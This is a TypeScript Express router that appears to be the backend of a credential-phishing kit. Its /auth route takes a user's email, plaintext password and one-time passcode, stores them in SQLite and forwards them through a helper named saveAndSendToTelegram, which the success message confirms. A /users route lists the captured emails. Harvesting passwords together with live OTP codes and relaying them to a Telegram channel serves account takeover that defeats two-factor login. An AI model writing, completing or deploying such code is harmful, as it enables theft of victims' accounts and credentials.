import express, { Router, Request, Response } from "express";
import { Database } from "sqlite";
import { initDB, saveAndSendToTelegram, User } from "./database";

const router: Router = express.Router();
let db: Database;

// Initialize DB
initDB()
  .then((database) => {
    db = database;
  })
  .catch((err: Error) => {
    console.error("Failed to initialize database:", err.message);
    process.exit(1);
  });

// POST /auth
router.post("/auth", async (req: Request, res: Response) => {
  try {
    const { email, password, otp } = req.body as User;

    if (!email || !password || !otp) {
      return res.status(400).json({ error: "All fields are required" });
    }

    const existing: User | undefined = await db.get(
      "SELECT * FROM users WHERE email = ?",
      [email]
    );
    if (existing) {
      return res.status(409).json({ error: "Email already exists" });
    }

    await saveAndSendToTelegram(db, email, password, otp);
    res.json({ message: "User data saved and sent to Telegram" });
  } catch (err: any) {
    console.error("Error in /auth:", err.message);
    res.status(500).json({ error: `Internal server error: ${err.message}` });
  }
});

// GET /users
router.get("/users", async (_req: Request, res: Response) => {
  try {
    const users: User[] = await db.all(
      "SELECT id, email, created_at FROM users"
    );
    res.json(users);
  } catch (err: any) {
    console.error("Error in /users:", err.message);
    res.status(500).json({ error: `Internal server error: ${err.message}` });
  }
});

export default router;
